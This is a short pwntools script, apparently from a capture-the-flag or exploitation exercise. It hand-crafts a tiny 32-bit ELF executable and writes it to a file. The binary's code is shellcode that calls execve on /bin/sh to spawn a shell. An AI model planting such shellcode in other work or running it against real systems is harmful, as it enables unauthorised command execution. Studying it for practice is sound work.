from pwn import *

elf_craft = b"""\x7F\x45\x4C\x46\x01\x01\x01\x00
\x00\x00\x00\x00\x00\x00\x00\x00
\x02\x00\x03\x00\x01\x00\x00\x00
\x00\x00\x69\x00\x00\x00\x00\x00
\x2c\x00\x00\x00\x00\x00\x00\x00
\x34\x00\x00\x00\x00\x00\x28\x00
\x01\x00\x00\x00\x06\x00\x00\x00
\x00\x00\x69\x00\x40\x00\x00\x00
\xB0\x0B\x68\x2F\x73\x68\x00\x68\x2F\x62\x69\x6E\x89\xE3\xCD\x80""".replace(b'\n', b'')

f = open('./test', 'wb')
f.write(elf_craft)
f.close()
